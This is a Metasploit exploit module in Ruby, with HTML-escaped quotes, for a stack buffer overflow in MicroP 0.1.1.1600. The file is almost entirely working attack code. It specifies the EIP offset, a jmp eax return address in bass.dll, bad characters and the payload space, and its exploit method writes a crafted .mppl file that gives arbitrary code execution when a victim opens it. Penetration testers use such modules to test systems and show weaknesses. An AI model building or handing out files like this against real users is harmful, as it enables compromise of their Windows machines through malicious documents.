# $Id: microp_mppl.rb 13114 2011-07-07 06:29:37Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;MicroP 0.1.1.1600 (MPPL File) Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in MicroP 0.1.1.1600.  A stack-based
                buffer overflow occurs when the content of a .mppl file gets copied onto the stack,
                which overwrites the lpFileName parameter of a CreateFileA() function, and results
                arbitrary code execution under the context of the user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;James Fitts&#039; ],
            &#039;Version&#039;        => &#039;$Revision: 13114 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/14720&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 728,
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP3 / Vista / 7&#039;,
                        {
                            &#039;Ret&#039;    => 0x100145b5,  #jmp eax in bass.dll
                            &#039;Offset&#039; => 1276,        #Offset to overwrite EIP
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Aug 23 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.mppl&#039;]),
                ], self.class)
    end
 
    def exploit
        mppl  = payload.encoded
        mppl << rand_text_alpha(target[&#039;Offset&#039;] - payload.encoded.length)
        mppl << [target.ret].pack(&#039;V&#039;)
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(mppl)
    end
 
end



